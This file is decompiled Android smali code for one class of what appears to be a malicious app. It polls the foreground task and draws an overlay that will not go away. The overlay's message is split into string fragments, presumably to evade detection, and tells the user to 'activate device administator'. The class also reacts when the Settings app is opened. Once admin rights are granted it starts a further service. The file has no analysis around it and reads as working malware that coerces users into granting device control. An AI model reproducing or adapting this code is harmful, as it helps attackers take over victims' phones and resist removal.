.class Lcom/zombie/ebola/w;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/zombie/ebola/v;

.field private final synthetic b:Landroid/os/Handler;


# direct methods
.method constructor <init>(Lcom/zombie/ebola/v;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    iput-object p2, p0, Lcom/zombie/ebola/w;->b:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/w;)Lcom/zombie/ebola/v;
    .locals 1

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 7

    const/4 v5, 0x0

    const/4 v6, 0x1

    const/16 v0, -0x10

    invoke-static {v0}, Landroid/os/Process;->setThreadPriority(I)V

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    const-string v1, "activity"

    invoke-virtual {v0, v1}, Lcom/zombie/ebola/zero;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    invoke-virtual {v0, v6}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v1, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    const-string v2, "device_policy"

    invoke-virtual {v0, v2}, Lcom/zombie/ebola/zero;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v2, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v3}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v3

    invoke-static {v3}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v3

    invoke-virtual {v3}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/zombie/ebola/goro;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    iget-boolean v0, v0, Lcom/zombie/ebola/zero;->a:Z

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0, v1}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    iput-boolean v6, v0, Lcom/zombie/ebola/zero;->a:Z

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    iget-object v3, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v3}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v3

    iget-object v3, v3, Lcom/zombie/ebola/u;->a:Landroid/view/WindowManager;

    iget-object v4, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v4}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v4

    iget-object v4, v4, Lcom/zombie/ebola/u;->b:Landroid/view/View;

    invoke-static {v0, v3, v4}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;Landroid/view/WindowManager;Landroid/view/View;)V

    :cond_0
    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    iget-boolean v0, v0, Lcom/zombie/ebola/zero;->a:Z

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0, v1}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    iput-boolean v5, v0, Lcom/zombie/ebola/zero;->a:Z

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    const-string v3, "layout_inflater"

    invoke-virtual {v0, v3}, Lcom/zombie/ebola/zero;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    const v3, 0x7f030008

    const/4 v4, 0x0

    invoke-virtual {v0, v3, v4}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v3

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    iget-object v4, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v4}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v4

    iget-object v4, v4, Lcom/zombie/ebola/u;->a:Landroid/view/WindowManager;

    iget-object v5, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v5}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v5

    iget-object v5, v5, Lcom/zombie/ebola/u;->c:Landroid/view/WindowManager$LayoutParams;

    invoke-static {v0, v4, v3, v5}, Lcom/zombie/ebola/v;->a(Lcom/zombie/ebola/v;Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;)V

    const v0, 0x7f070038

    invoke-virtual {v3, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    const-string v4, "\nActio"

    const-string v5, "n requir"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "ed.\n\nThis is sy"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "stem applica"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "tion.\n\n   You mu"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "st activate "

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "device administator.   \n"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const v0, 0x7f070039

    invoke-virtual {v3, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    new-instance v4, Lcom/zombie/ebola/x;

    invoke-direct {v4, p0, v3}, Lcom/zombie/ebola/x;-><init>(Lcom/zombie/ebola/w;Landroid/view/View;)V

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string v0, "com."

    const-string v3, "a"

    const-string v4, "oid.se"

    const-string v5, "ttings"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->a(Lcom/zombie/ebola/v;)V

    :cond_1
    if-nez v2, :cond_2

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    iget-object v1, p0, Lcom/zombie/ebola/w;->b:Landroid/os/Handler;

    const/16 v3, 0xa

    invoke-static {v0, v1, p0, v3}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;Landroid/os/Handler;Ljava/lang/Runnable;I)V

    :cond_2
    if-eqz v2, :cond_3

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v2}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v2

    invoke-static {v2}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v2

    invoke-virtual {v2}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/zombie/ebola/jora;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcom/zombie/ebola/zero;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->b(Lcom/zombie/ebola/v;)V

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    iput-boolean v6, v0, Lcom/zombie/ebola/zero;->b:Z

    iget-object v0, p0, Lcom/zombie/ebola/w;->a:Lcom/zombie/ebola/v;

    invoke-static {v0}, Lcom/zombie/ebola/v;->c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v0

    invoke-virtual {v0}, Lcom/zombie/ebola/zero;->stopSelf()V

    :cond_3
    return-void
.end method
